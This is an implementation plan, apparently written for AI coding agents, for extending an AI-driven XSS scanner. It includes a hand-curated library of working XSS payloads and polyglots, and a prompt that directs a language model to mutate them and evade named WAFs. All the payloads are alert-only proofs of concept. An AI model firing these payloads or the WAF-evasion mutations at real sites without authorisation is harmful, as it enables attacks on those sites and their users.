# Payload Intelligence Improvements Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Four interconnected improvements — golden seed library, fast mode parallel seeded calls, normal mode T1 early exit on 0-reflect, and deep mode stored XSS shortcut path — that together eliminate the three main scan timeout/quality failure modes.

**Architecture:** New `ai_xss_generator/payloads/golden_seeds.py` module provides hand-curated seed payloads by context; `models.py` gains `generate_fast_seeded_batch` (7 parallel seeded calls) and `generate_deep_stored`; `worker.py` gains a 2-line T1 early exit inside the pre-rank block and a new stored branch before the T1 loop in deep mode.

**Tech Stack:** Python 3.11+, `concurrent.futures.ThreadPoolExecutor` for parallel API calls, `requests` (already used in models.py), pytest for tests.

---

## File Map

| File | Action | Responsibility |
|------|--------|----------------|
| `ai_xss_generator/payloads/__init__.py` | **Create** | Empty package init |
| `ai_xss_generator/payloads/golden_seeds.py` | **Create** | Curated seed library + public API |
| `ai_xss_generator/models.py` | **Modify** | Add `generate_fast_seeded_batch()` + `generate_deep_stored()` |
| `ai_xss_generator/active/worker.py` | **Modify** | T1 early exit (lines 1390–1406) + deep stored branch |
| `ai_xss_generator/active/orchestrator.py` | **Modify** | Call `generate_fast_seeded_batch` instead of `generate_fast_batch` |
| `tests/test_golden_seeds.py` | **Create** | Unit tests for seed library API |
| `tests/test_fast_seeded_batch.py` | **Create** | Unit tests for `generate_fast_seeded_batch` |
| `tests/test_active_worker_order.py` | **Modify** | Add T1 early exit + stored branch tests |

---

## Task 1: Golden Seed Library

**Files:**
- Create: `ai_xss_generator/payloads/__init__.py`
- Create: `ai_xss_generator/payloads/golden_seeds.py`
- Create: `tests/test_golden_seeds.py`

### Background

The seeds are the foundation for Tasks 2, 3, and 4. Complete this task before the others.

- [ ] **Step 1: Write the failing tests**

```python
# tests/test_golden_seeds.py
from ai_xss_generator.payloads.golden_seeds import (
    GOLDEN_SEEDS,
    STORED_UNIVERSAL,
    all_seeds_flat,
    seeds_for_context,
    stored_universal_payloads,
)


def test_all_seven_context_keys_present():
    expected = {
        "html_body", "html_attr_event", "html_attr_url",
        "js_string_dq", "js_string_sq", "js_template",
        "url_fragment",
    }
    assert set(GOLDEN_SEEDS.keys()) == expected


def test_seeds_for_known_context_returns_up_to_n():
    result = seeds_for_context("html_body", n=2)
    assert len(result) <= 2
    assert all(isinstance(p, str) and p.strip() for p in result)


def test_seeds_for_unknown_context_falls_back_to_polyglots():
    result = seeds_for_context("unknown_context_xyz", n=3)
    assert len(result) > 0
    # Should fall back to polyglots from any key that has them, or return non-empty
    assert all(isinstance(p, str) for p in result)


def test_all_seeds_flat_deduplicated():
    flat = all_seeds_flat()
    assert len(flat) == len(set(flat)), "Duplicate seeds found in all_seeds_flat()"


def test_all_seeds_flat_non_empty():
    flat = all_seeds_flat()
    assert len(flat) >= 10  # sanity: at least 10 unique seeds


def test_stored_universal_payloads_non_empty():
    payloads = stored_universal_payloads()
    assert len(payloads) >= 5
    assert all(isinstance(p, str) and p.strip() for p in payloads)


def test_no_payload_appears_twice_in_golden_seeds():
    all_payloads = [p for seeds in GOLDEN_SEEDS.values() for p in seeds]
    assert len(all_payloads) == len(set(all_payloads)), "Duplicate in GOLDEN_SEEDS"


def test_seeds_for_context_n_zero_returns_empty():
    assert seeds_for_context("html_body", n=0) == []


def test_polyglot_key_present():
    # polyglot is used as fallback — must exist
    assert "polyglot" in GOLDEN_SEEDS
    assert len(GOLDEN_SEEDS["polyglot"]) >= 1
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
cd /home/ryushe/tools/axss && source venv/bin/activate && pytest tests/test_golden_seeds.py -v 2>&1 | head -30
```

Expected: `ModuleNotFoundError` or `ImportError` — module does not exist yet.

- [ ] **Step 3: Create the package init**

```python
# ai_xss_generator/payloads/__init__.py
# Golden seed library package — hand-curated XSS seeds for context-seeded generation.
```

- [ ] **Step 4: Create the golden seeds module**

```python
# ai_xss_generator/payloads/golden_seeds.py
"""Hand-curated XSS seed payload library.

Organized by context_type matching probe.py ReflectionContext.context_type values.
Each payload calls alert(document.domain) or confirm(document.domain).
No two payloads share the same element+event_handler combination.
Sources: PortSwigger XSS cheat sheet, dalfox payload library, public WAF bypass
research, bug bounty writeups.
"""
from __future__ import annotations

# ---------------------------------------------------------------------------
# Curated seed library — organized by injection context
# ---------------------------------------------------------------------------

GOLDEN_SEEDS: dict[str, list[str]] = {
    "html_body": [
        "<details open ontoggle=alert(document.domain)>",
        "<svg/onload=alert(document.domain)>",
        "<img src=x onerror=alert(document.domain)>",
        "<video><source onerror=alert(document.domain)></video>",
        "<body onload=alert(document.domain)>",
        "<input autofocus onfocus=alert(document.domain)>",
        "<marquee onstart=alert(document.domain)>",
        "<object data=javascript:alert(document.domain)>",
        "<embed src=javascript:alert(document.domain)>",
        "<audio src=x onerror=alert(document.domain)>",
        "<math><mtext></table></math><img src=x onerror=alert(document.domain)>",
        "<noscript><p title=\"</noscript><img src=x onerror=alert(document.domain)>\">",
    ],
    "html_attr_event": [
        "\" autofocus onfocus=alert(document.domain) x=\"",
        "\" onmouseover=alert(document.domain) x=\"",
        "' onerror=alert(document.domain) x='",
        "\" onpointerenter=alert(document.domain) x=\"",
        "\" onanimationstart=alert(document.domain) style=\"animation-name:x\" x=\"",
        "\" onblur=alert(document.domain) tabindex=1 id=x x=\"",
        "\" onclick=alert(document.domain) x=\"",
        "' onload=alert(document.domain) x='",
    ],
    "html_attr_url": [
        "javascript:alert(document.domain)",
        "javascript://%0aalert(document.domain)",
        "data:text/html,<script>alert(document.domain)</script>",
        "javascript:void(0);alert(document.domain)",
        "javascript:/*--></title></style></textarea></script><xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(document.domain)//'",
        "j&#97;vascript:alert(document.domain)",
    ],
    "js_string_dq": [
        "\"-alert(document.domain)-\"",
        "\";alert(document.domain)//",
        "\\u0022;alert(document.domain)//",
        "\"+alert(document.domain)+\"",
        "\";/**/alert(document.domain)//",
    ],
    "js_string_sq": [
        "'-alert(document.domain)-'",
        "';alert(document.domain)//",
        "\\u0027;alert(document.domain)//",
        "'+alert(document.domain)+'",
        "';/**/alert(document.domain)//",
    ],
    "js_template": [
        "${alert(document.domain)}",
        "`;alert(document.domain)//`",
        "${alert`document.domain`}",
    ],
    "url_fragment": [
        "#\"><img src=x onerror=alert(document.domain)>",
        "#javascript:alert(document.domain)",
        "#<img src=x onerror=alert(document.domain)>",
    ],
    "polyglot": [
        "jaVasCript:/*-/*`/*`/*'/*\"/**/(/* */oNcliCk=alert(document.domain))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(document.domain)//>\\x3e",
        "\"><svg/onload=alert(document.domain)>'\"><img src=x onerror=alert(document.domain)>",
        "';alert(document.domain)//\"><img src=x onerror=alert(document.domain)><!--",
    ],
}

# Universal stored XSS payloads — simple, clean, no WAF-bypass complexity needed.
# Stored XSS is typically less filtered than reflected (no WAF between DB write
# and render), so basic payloads succeed where complex ones are overkill.
STORED_UNIVERSAL: list[str] = [
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(document.domain)>",
    "<svg onload=alert(document.domain)>",
    "<details open ontoggle=alert(document.domain)>",
    "<body onload=alert(document.domain)>",
    "<video><source onerror=alert(document.domain)></video>",
    "'><script>alert(document.domain)</script>",
    "'\"><img src=x onerror=alert(document.domain)>",
    "<input autofocus onfocus=alert(document.domain)>",
    "<audio src=x onerror=alert(document.domain)>",
    "<embed src=javascript:alert(document.domain)>",
    "javascript:alert(document.domain)",
]


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def seeds_for_context(context_type: str, n: int = 3) -> list[str]:
    """Return up to n golden seeds for context_type. Falls back to polyglots."""
    if n <= 0:
        return []
    candidates = GOLDEN_SEEDS.get(context_type) or GOLDEN_SEEDS.get("polyglot", [])
    return list(candidates[:n])


def all_seeds_flat() -> list[str]:
    """Return all seeds from GOLDEN_SEEDS deduplicated, preserving first-seen order."""
    seen: set[str] = set()
    result: list[str] = []
    for payloads in GOLDEN_SEEDS.values():
        for p in payloads:
            if p not in seen:
                seen.add(p)
                result.append(p)
    return result


def stored_universal_payloads() -> list[str]:
    """Return the universal stored XSS payload list."""
    return list(STORED_UNIVERSAL)
```

- [ ] **Step 5: Run tests to verify they pass**

```bash
cd /home/ryushe/tools/axss && source venv/bin/activate && pytest tests/test_golden_seeds.py -v
```

Expected: All 9 tests pass.

- [ ] **Step 6: Commit**

```bash
cd /home/ryushe/tools/axss && git add ai_xss_generator/payloads/__init__.py ai_xss_generator/payloads/golden_seeds.py tests/test_golden_seeds.py
git commit -m "feat: add golden seed library for context-seeded payload generation"
```

---

## Task 2: Fast Mode Rework (`generate_fast_seeded_batch`)

**Files:**
- Modify: `ai_xss_generator/models.py` (append after line 3170)
- Modify: `ai_xss_generator/active/orchestrator.py` (lines 421–433)
- Create: `tests/test_fast_seeded_batch.py`

### Background

`generate_fast_batch` makes one 50-payload cold API call with a 180s timeout — which reliably times out. The new function fires 7 parallel context-specific calls via `ThreadPoolExecutor`, each seeded with 2–3 golden seeds + mutation technique instructions, with a 600s timeout for the whole batch.

The `_call_api` helper pattern in `generate_fast_batch` (lines 2969–2995) is the exact pattern to reuse for each parallel call.

### Context descriptions (for prompt)

| context_type | description |
|---|---|
| html_body | Injected directly into HTML document body between tags |
| html_attr_event | Injected into an HTML attribute value where event handlers may be added |
| html_attr_url | Injected into href, src, action, or formaction — supports javascript: URIs |
| js_string_dq | Injected inside a JavaScript double-quoted string |
| js_string_sq | Injected inside a JavaScript single-quoted string |
| js_template | Injected inside a JavaScript template literal |
| url_fragment | Injected into URL hash/fragment processed by client-side JS |

- [ ] **Step 1: Write the failing tests**

```python
# tests/test_fast_seeded_batch.py
from unittest.mock import MagicMock, patch

import pytest

from ai_xss_generator.models import generate_fast_seeded_batch
from ai_xss_generator.types import PayloadCandidate


_SEVEN_CONTEXTS = [
    "html_body", "html_attr_event", "html_attr_url",
    "js_string_dq", "js_string_sq", "js_template", "url_fragment",
]


def _make_mock_response(context_type: str) -> dict:
    return {
        "payloads": [
            {
                "payload": f"<img onerror=alert(1)>",
                "title": f"test-{context_type}",
                "tags": [f"context:{context_type}"],
                "bypass_family": "raw",
                "risk_score": 7,
            }
        ] * 3
    }


def test_fires_exactly_seven_calls():
    """generate_fast_seeded_batch must make exactly 7 API calls, one per context."""
    call_count = 0

    def fake_post(url, **kwargs):
        nonlocal call_count
        call_count += 1
        # Extract context_type from prompt to return matching mock
        prompt = kwargs.get("json", {}).get("messages", [{}])[-1].get("content", "")
        ctx = "html_body"
        for c in _SEVEN_CONTEXTS:
            if f'"{c}"' in prompt:
                ctx = c
                break
        mock_resp = MagicMock()
        mock_resp.raise_for_status = MagicMock()
        mock_resp.json.return_value = {
            "choices": [{"message": {"content": str(_make_mock_response(ctx)).replace("'", '"')}}]
        }
        # Return valid JSON content
        import json
        mock_resp.json.return_value = {
            "choices": [{"message": {"content": json.dumps(_make_mock_response(ctx))}}]
        }
        return mock_resp

    with patch("requests.post", side_effect=fake_post):
        with patch("ai_xss_generator.models.load_api_key", return_value="test-key"):
            with patch.dict("os.environ", {"OPENROUTER_API_KEY": "test-key"}, clear=False):
                result = generate_fast_seeded_batch(
                    cloud_model="test-model",
                    count_per_context=3,
                    request_timeout_seconds=5,
                )

    assert call_count == 7, f"Expected 7 calls, got {call_count}"


def test_returns_payload_candidates():
    """Return value must be list[PayloadCandidate]."""
    import json

    def fake_post(url, **kwargs):
        prompt = kwargs.get("json", {}).get("messages", [{}])[-1].get("content", "")
        ctx = "html_body"
        for c in _SEVEN_CONTEXTS:
            if f'"{c}"' in prompt:
                ctx = c
                break
        mock_resp = MagicMock()
        mock_resp.raise_for_status = MagicMock()
        mock_resp.json.return_value = {
            "choices": [{"message": {"content": json.dumps(_make_mock_response(ctx))}}]
        }
        return mock_resp

    with patch("requests.post", side_effect=fake_post):
        with patch("ai_xss_generator.models.load_api_key", return_value="test-key"):
            with patch.dict("os.environ", {"OPENROUTER_API_KEY": "test-key"}, clear=False):
                result = generate_fast_seeded_batch(
                    cloud_model="test-model",
                    count_per_context=3,
                    request_timeout_seconds=5,
                )

    assert isinstance(result, list)
    assert all(isinstance(p, PayloadCandidate) for p in result)
    assert len(result) > 0


def test_each_call_receives_seeds_for_its_context():
    """Each of the 7 API calls must contain seeds matching its context_type in prompt."""
    from ai_xss_generator.payloads.golden_seeds import GOLDEN_SEEDS

    prompts_received: list[str] = []

    def fake_post(url, **kwargs):
        import json
        prompts_received.append(
            kwargs.get("json", {}).get("messages", [{}])[-1].get("content", "")
        )
        mock_resp = MagicMock()
        mock_resp.raise_for_status = MagicMock()
        mock_resp.json.return_value = {
            "choices": [{"message": {"content": json.dumps({"payloads": []})}}]
        }
        return mock_resp

    with patch("requests.post", side_effect=fake_post):
        with patch("ai_xss_generator.models.load_api_key", return_value="test-key"):
            with patch.dict("os.environ", {"OPENROUTER_API_KEY": "test-key"}, clear=False):
                generate_fast_seeded_batch(
                    cloud_model="test-model",
                    count_per_context=2,
                    request_timeout_seconds=5,
                )

    # Each prompt should mention its context_type
    for prompt in prompts_received:
        found = any(ctx in prompt for ctx in _SEVEN_CONTEXTS)
        assert found, f"Prompt doesn't reference any known context_type: {prompt[:100]}"


def test_waf_hint_appended_to_prompts():
    """When waf_hint is set, each prompt should contain WAF-specific instructions."""
    prompts_received: list[str] = []

    def fake_post(url, **kwargs):
        import json
        prompts_received.append(
            kwargs.get("json", {}).get("messages", [{}])[-1].get("content", "")
        )
        mock_resp = MagicMock()
        mock_resp.raise_for_status = MagicMock()
        mock_resp.json.return_value = {
            "choices": [{"message": {"content": json.dumps({"payloads": []})}}]
        }
        return mock_resp

    with patch("requests.post", side_effect=fake_post):
        with patch("ai_xss_generator.models.load_api_key", return_value="test-key"):
            with patch.dict("os.environ", {"OPENROUTER_API_KEY": "test-key"}, clear=False):
                generate_fast_seeded_batch(
                    cloud_model="test-model",
                    waf_hint="cloudflare",
                    count_per_context=2,
                    request_timeout_seconds=5,
                )

    for prompt in prompts_received:
        assert "cloudflare" in prompt.lower(), f"WAF hint not found in prompt: {prompt[:100]}"


def test_returns_empty_list_on_all_failures():
    """If all 7 calls fail, return [] gracefully (no exception)."""
    def fake_post(url, **kwargs):
        raise ConnectionError("simulated failure")

    with patch("requests.post", side_effect=fake_post):
        with patch("ai_xss_generator.models.load_api_key", return_value="test-key"):
            with patch.dict("os.environ", {"OPENROUTER_API_KEY": "test-key"}, clear=False):
                result = generate_fast_seeded_batch(
                    cloud_model="test-model",
                    count_per_context=2,
                    request_timeout_seconds=5,
                )
    assert result == []
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
cd /home/ryushe/tools/axss && source venv/bin/activate && pytest tests/test_fast_seeded_batch.py -v 2>&1 | head -30
```

Expected: `ImportError: cannot import name 'generate_fast_seeded_batch'`

- [ ] **Step 3: Add `generate_fast_seeded_batch` to `models.py`**

Append after the final line of `models.py` (after line 3170):

```python


# ---------------------------------------------------------------------------
# Per-context prompt template for seeded fast batch generation
# ---------------------------------------------------------------------------

_FAST_SEEDED_CONTEXT_DESCRIPTIONS: dict[str, str] = {
    "html_body": "Injected directly into HTML document body between tags",
    "html_attr_event": "Injected into an HTML attribute value where event handlers may be added",
    "html_attr_url": "Injected into href, src, action, or formaction — supports javascript: URIs",
    "js_string_dq": "Injected inside a JavaScript double-quoted string literal",
    "js_string_sq": "Injected inside a JavaScript single-quoted string literal",
    "js_template": "Injected inside a JavaScript template literal (backtick string)",
    "url_fragment": "Injected into URL hash/fragment processed by client-side JavaScript",
}

_FAST_SEEDED_CONTEXT_PROMPT = """\
Generate {count} XSS payloads for the "{context_type}" injection context.

Context description: {context_description}

Seed payloads (confirmed working — use as mutation starting points):
{seeds_text}

Mutation techniques to apply independently across your outputs:
- Keyword case variation: oNlOaD, ScRiPt, AlErT
- HTML entity encoding of event keywords: &#111;&#110;&#108;&#111;&#97;&#100;
- URL / double-URL encoding: %6f%6e, %256f%256e
- Whitespace substitution: %09 %0a %0d /**/ between attributes
- Alternative event handlers compatible with this context
- Alternative JS calls: alert() confirm() prompt() (confirm)``
- Comment injection between tag parts: <!-- --> /**/
- Null byte insertion: %00 between tag/event keywords{waf_instructions}

Return JSON: {{"payloads": [{{"payload": "...", "title": "...", "tags": ["context:{context_type}"], "bypass_family": "...", "risk_score": 1}}]}}
Generate exactly {count} payloads.\
"""

_FAST_SEEDED_WAF_INSTRUCTIONS = """
- Known {waf} bypass patterns: focus on techniques that evade {waf} specifically"""


def generate_fast_seeded_batch(
    cloud_model: str,
    waf_hint: str | None = None,
    count_per_context: int = 8,
    ai_backend: str = "api",
    cli_tool: str = "claude",
    cli_model: str | None = None,
    request_timeout_seconds: int = 600,
) -> list[PayloadCandidate]:
    """Generate seeded context-specific payloads via 7 parallel API calls.

    Replaces generate_fast_batch() in the fast mode scan path. Instead of one
    cold 50-payload call, fires 7 concurrent context-specific calls each seeded
    with 2-3 golden library payloads + mutation technique instructions.

    Args:
        cloud_model:              Cloud model identifier.
        waf_hint:                 Known/detected WAF name — adds bypass instructions.
        count_per_context:        Payloads to request per context (default 8, × 7 = 56 total).
        ai_backend:               "api" (default) or "cli".
        cli_tool:                 CLI tool name (for cli backend only).
        cli_model:                CLI model (for cli backend only).
        request_timeout_seconds:  Per-call HTTP timeout (default 600s = 10 min).

    Returns:
        Merged deduplicated list[PayloadCandidate]. Returns [] on total failure.
    """
    import concurrent.futures

    from ai_xss_generator.payloads.golden_seeds import seeds_for_context

    contexts = list(_FAST_SEEDED_CONTEXT_DESCRIPTIONS.keys())

    system_msg = (
        "You are an expert offensive-security researcher specialising in XSS. "
        "Return strict JSON only — no markdown, no commentary outside the JSON object."
    )

    waf_instr = (
        _FAST_SEEDED_WAF_INSTRUCTIONS.format(waf=waf_hint)
        if waf_hint else ""
    )

    def _build_prompt(context_type: str) -> str:
        seeds = seeds_for_context(context_type, n=3)
        seeds_text = "\n".join(f"  {s}" for s in seeds) if seeds else "  (none available)"
        return _FAST_SEEDED_CONTEXT_PROMPT.format(
            count=count_per_context,
            context_type=context_type,
            context_description=_FAST_SEEDED_CONTEXT_DESCRIPTIONS[context_type],
            seeds_text=seeds_text,
            waf_instructions=waf_instr,
        )

    def _call_one_context(context_type: str) -> list[PayloadCandidate]:
        prompt = _build_prompt(context_type)
        source = f"fast_seeded:{context_type}"

        # CLI backend
        if ai_backend == "cli":
            try:
                from ai_xss_generator.cli_runner import generate_via_cli_with_tool
                raw, _used = generate_via_cli_with_tool(
                    cli_tool, prompt, model=cli_model or None,
                    timeout_seconds=request_timeout_seconds,
                )
                data = _extract_json_blob(raw)
                return _normalize_payloads(data.get("payloads", []), source=source)
            except Exception as exc:
                log.debug("generate_fast_seeded_batch CLI error [%s]: %s", context_type, exc)
                return []

        # API backend — try OpenRouter then OpenAI
        from ai_xss_generator.config import load_api_key

        def _api_call(base_url: str, api_key: str, model: str) -> list[PayloadCandidate]:
            headers: dict[str, str] = {
                "Authorization": f"Bearer {api_key}",
                "Content-Type": "application/json",
            }
            if "openrouter" in base_url:
                headers["HTTP-Referer"] = "https://github.com/axss"
                headers["X-Title"] = "axss"
            import requests as _req
            resp = _req.post(
                f"{base_url}/chat/completions",
                headers=headers,
                json={
                    "model": model,
                    "response_format": {"type": "json_object"},
                    "messages": [
                        {"role": "system", "content": system_msg},
                        {"role": "user",   "content": prompt},
                    ],
                    "temperature": 0.7,
                },
                timeout=max(1, request_timeout_seconds),
            )
            resp.raise_for_status()
            content = resp.json()["choices"][0]["message"]["content"]
            data = _extract_json_blob(content)
            return _normalize_payloads(data.get("payloads", []), source=source)

        resolved_model = cloud_model or OPENAI_FALLBACK_MODEL
        api_key = os.environ.get("OPENROUTER_API_KEY", "") or load_api_key("openrouter_api_key")
        if api_key:
            try:
                return _api_call(OPENROUTER_BASE_URL, api_key, resolved_model)
            except Exception as exc:
                log.debug("generate_fast_seeded_batch OpenRouter error [%s]: %s", context_type, exc)

        api_key = os.environ.get("OPENAI_API_KEY", "") or load_api_key("openai_api_key")
        if api_key:
            try:
                return _api_call(OPENAI_BASE_URL, api_key, resolved_model)
            except Exception as exc:
                log.debug("generate_fast_seeded_batch OpenAI error [%s]: %s", context_type, exc)

        return []

    log.info(
        "Fast seeded batch: firing %d parallel context-specific calls (model=%s)…",
        len(contexts), cloud_model,
    )

    results: list[PayloadCandidate] = []
    seen_payloads: set[str] = set()

    with concurrent.futures.ThreadPoolExecutor(max_workers=len(contexts)) as executor:
        futures = {executor.submit(_call_one_context, ctx): ctx for ctx in contexts}
        for future in concurrent.futures.as_completed(futures):
            ctx = futures[future]
            try:
                batch = future.result()
                for candidate in batch:
                    p_text = _payload_text(candidate) if hasattr(candidate, "payload") else str(candidate)
                    if p_text and p_text not in seen_payloads:
                        seen_payloads.add(p_text)
                        results.append(candidate)
            except Exception as exc:
                log.debug("generate_fast_seeded_batch future error [%s]: %s", ctx, exc)

    log.info("Fast seeded batch complete: %d unique payloads", len(results))
    return results
```

**Note:** `_payload_text` is already defined in `models.py` — grep for it to confirm before adding. If not found, add a simple helper: `def _payload_text(c: Any) -> str: return c.payload if hasattr(c, "payload") else str(c)`. Check first with:
```bash
grep -n "_payload_text" /home/ryushe/tools/axss/ai_xss_generator/models.py | head -5
```

- [ ] **Step 4: Run fast_seeded_batch tests to verify they pass**

```bash
cd /home/ryushe/tools/axss && source venv/bin/activate && pytest tests/test_fast_seeded_batch.py -v
```

Expected: All 5 tests pass.

- [ ] **Step 5: Wire up orchestrator to use `generate_fast_seeded_batch`**

In `ai_xss_generator/active/orchestrator.py`, replace lines 421–433:

```python
# OLD:
        from ai_xss_generator.models import generate_fast_batch
        step("Fast mode: generating payload batch…")
        fast_batch = generate_fast_batch(
            cloud_model=config.cloud_model,
            waf=config.waf,
            ai_backend=config.ai_backend,
            cli_tool=config.cli_tool,
            cli_model=config.cli_model,
        )
        if fast_batch:
            info(f"Fast batch ready: {len(fast_batch)} payloads")
        else:
            warn("Fast batch generation failed — workers will fall back to per-URL generation")
```

```python
# NEW:
        from ai_xss_generator.models import generate_fast_seeded_batch
        step("Fast mode: generating payload library (7 context-specific batches)…")
        fast_batch = generate_fast_seeded_batch(
            cloud_model=config.cloud_model,
            waf_hint=config.waf,
            ai_backend=config.ai_backend,
            cli_tool=config.cli_tool,
            cli_model=config.cli_model,
        )
        if fast_batch:
            info(f"Fast batch ready: {len(fast_batch)} payloads")
        else:
            warn("Fast batch generation failed — workers will fall back to per-URL generation")
```

- [ ] **Step 6: Run full test suite to catch regressions**

```bash
cd /home/ryushe/tools/axss && source venv/bin/activate && pytest tests/ -x -q --ignore=tests/test_network_utils.py 2>&1 | tail -20
```

Expected: All tests pass (same passing count as before + 5 new).

- [ ] **Step 7: Commit**

```bash
cd /home/ryushe/tools/axss && git add ai_xss_generator/models.py ai_xss_generator/active/orchestrator.py tests/test_fast_seeded_batch.py
git commit -m "feat: replace generate_fast_batch with 7-parallel generate_fast_seeded_batch"
```

---

## Task 3: Normal Mode T1 Early Exit

**Files:**
- Modify: `ai_xss_generator/active/worker.py` (lines 1389–1408)
- Modify: `ai_xss_generator/active/worker.py` (T3-scout seeds fallback, lines ~1753–1768)
- Modify: `tests/test_active_worker_order.py`

### Background

The pre-rank block (lines 1365–1408 in worker.py) currently builds `_ranked` then unconditionally assigns `tier1_candidates = _ranked + _non_reflecting + tier1_candidates[10:]`. If `_ranked` is empty (0/N reflect), we fire all 1944 T1 Playwright candidates anyway — guaranteeing a timeout on filter labs. The fix: set `tier1_candidates = []` when `_ranked` is empty, causing the T1 loop to be a no-op, and skip directly to T3-scout.

The T3-scout currently receives `tier1_seeds = [_payload_text(c) for c in tier1_candidates[:3]]` which will be empty when T1 was skipped — causing `generate_normal_scout` to return `[]` (it guards on empty seeds). Fix: fall back to golden seeds.

### Exact code change 1: T1 early exit (inside pre-rank try block)

Current code at lines 1389–1408:
```python
                            # Reflecting payloads first, then remaining (sorted by risk_score)
                            _ranked.sort(key=lambda c: -getattr(c, "risk_score", 0))
                            _non_reflecting.sort(key=lambda c: -getattr(c, "risk_score", 0))
                            tier1_candidates = _ranked + _non_reflecting + tier1_candidates[10:]
                            # -vv: pre-rank result
                            _prerank_top = ""
                            if _ranked:
                                _prerank_top = _trunc(_payload_text(_ranked[0]) or "", 50)
                                _console.debug(
                                    f"GET ?{_trunc(param_name, 20)} [{context_type}] "
                                    f"Pre-rank: {len(_ranked)}/{len(_check_candidates)} reflect | "
                                    f"top: \"{_prerank_top}\""
                                )
                            else:
                                _console.debug(
                                    f"GET ?{_trunc(param_name, 20)} [{context_type}] "
                                    f"Pre-rank: 0/{len(_check_candidates)} reflect — order unchanged"
                                )
                        except Exception as _rank_exc:
                            log.debug("Tier 1 HTTP pre-rank failed: %s", _rank_exc)
```

Replace with:
```python
                            # Reflecting payloads first, then remaining (sorted by risk_score)
                            if _ranked:
                                _ranked.sort(key=lambda c: -getattr(c, "risk_score", 0))
                                _non_reflecting.sort(key=lambda c: -getattr(c, "risk_score", 0))
                                tier1_candidates = _ranked + _non_reflecting + tier1_candidates[10:]
                                _prerank_top = _trunc(_payload_text(_ranked[0]) or "", 50)
                                _console.debug(
                                    f"GET ?{_trunc(param_name, 20)} [{context_type}] "
                                    f"Pre-rank: {len(_ranked)}/{len(_check_candidates)} reflect | "
                                    f"top: \"{_prerank_top}\""
                                )
                            else:
                                # 0 of N top candidates reflected via HTTP — filter is blocking
                                # everything. Skip all 1944 Playwright checks (would all miss)
                                # and escalate directly to T3-scout.
                                tier1_candidates = []
                                _v_steps.append("T1:skip(0-reflect)")
                                _console.debug(
                                    f"GET ?{_trunc(param_name, 20)} [{context_type}] "
                                    f"Pre-rank: 0/{len(_check_candidates)} reflect — T1 skipped"
                                )
                        except Exception as _rank_exc:
                            log.debug("Tier 1 HTTP pre-rank failed: %s", _rank_exc)
```

### Exact code change 2: T3-scout golden seed fallback

Find the T3-scout section (around line 1753). Current code that builds `_scout_payloads`:
```python
                    if mode == "normal" and not context_done and not _timed_out() and use_cloud:
                        from ai_xss_generator.models import generate_normal_scout
                        _scout_frameworks = [
                            str(item).lower()
                            for item in getattr(_cached_context, "frameworks", [])[:3]
                        ]
                        _scout_payloads = generate_normal_scout(
                            context_type,
                            waf_hint,
                            _scout_frameworks,
                            seeds=tier1_seeds,
```

The `tier1_seeds` line (around 1411) computes: `tier1_seeds = [_payload_text(c) for c in tier1_candidates[:3] if _payload_text(c)]`

When `tier1_candidates = []` (T1 skipped), `tier1_seeds` will be `[]`. `generate_normal_scout` returns `[]` for empty seeds. Fix by adding a golden seed fallback right before the `generate_normal_scout` call:

```python
                    if mode == "normal" and not context_done and not _timed_out() and use_cloud:
                        from ai_xss_generator.models import generate_normal_scout
                        _scout_frameworks = [
                            str(item).lower()
                            for item in getattr(_cached_context, "frameworks", [])[:3]
                        ]
                        # When T1 was skipped (0-reflect early exit), tier1_seeds is empty.
                        # Fall back to context-appropriate golden seeds so the scout has
                        # something to mutate rather than returning empty-handed.
                        _effective_seeds = tier1_seeds
                        if not _effective_seeds:
                            from ai_xss_generator.payloads.golden_seeds import seeds_for_context as _gsc
                            _effective_seeds = _gsc(context_type, n=3)
                        _scout_payloads = generate_normal_scout(
                            context_type,
                            waf_hint,
                            _scout_frameworks,
                            seeds=_effective_seeds,
```

- [ ] **Step 1: Write the failing tests**

Add to `tests/test_active_worker_order.py`:

```python
# --- T1 Early Exit Tests ---

def test_t1_skipped_when_zero_reflect(monkeypatch):
    """When all pre-rank HTTP checks return False, T1 candidates must be empty."""
    from ai_xss_generator.active.worker import _run
    # ... use existing _run() test infrastructure from the file.
    # The pattern: mock probe_param_context to return a valid html_body result,
    # mock _http_reflects_payload to always return False,
    # mock executor.fire so we can count how many times it's called.
    # Assert: fire() is never called with transform_name="tier1_deterministic"
    # Assert: _v_steps contains "T1:skip(0-reflect)" (check via -vv output or
    #         by inspecting the worker result's verbose field if available)
    pass  # replace with real implementation below


def test_t1_fires_normally_when_some_reflect(monkeypatch):
    """When at least one pre-rank HTTP check returns True, T1 fires normally."""
    pass  # replace with real implementation below


def test_t3_scout_receives_golden_seeds_when_t1_skipped(monkeypatch):
    """When T1 is skipped (empty tier1_seeds), T3-scout receives golden seeds."""
    pass  # replace with real implementation below
```

**Note:** The existing tests in `test_active_worker_order.py` show the full pattern. Read the file first:

```bash
head -100 /home/ryushe/tools/axss/tests/test_active_worker_order.py
```

Then write the three tests using the same `_run()` + mock pattern. The key mocks needed:
- `ai_xss_generator.probe.probe_param_context` → valid `ProbeResult` for `html_body`
- `ai_xss_generator.active.executor._http_reflects_payload` → `False` (for skipped test) or one `True` (for fires-normally test)
- `ai_xss_generator.active.executor.ActiveExecutor.fire` → `MagicMock(confirmed=False)`
- `ai_xss_generator.models.generate_normal_scout` → capture `seeds` argument

- [ ] **Step 2: Run tests to verify they fail**

```bash
cd /home/ryushe/tools/axss && source venv/bin/activate && pytest tests/test_active_worker_order.py -v -k "t1_skip or t1_fires or t3_scout_golden" 2>&1 | tail -20
```

Expected: 3 tests collected, all FAIL or ERROR (not yet implemented in worker).

- [ ] **Step 3: Apply T1 early exit change to `worker.py`**

Use the exact old/new strings above for the pre-rank block. Use `Edit` tool with the full old string (lines 1389–1408 including leading whitespace).

- [ ] **Step 4: Apply T3-scout golden seed fallback to `worker.py`**

Find the `if mode == "normal" and not context_done` block (~line 1753). Replace the `_scout_payloads = generate_normal_scout(... seeds=tier1_seeds,` section with the `_effective_seeds` version above.

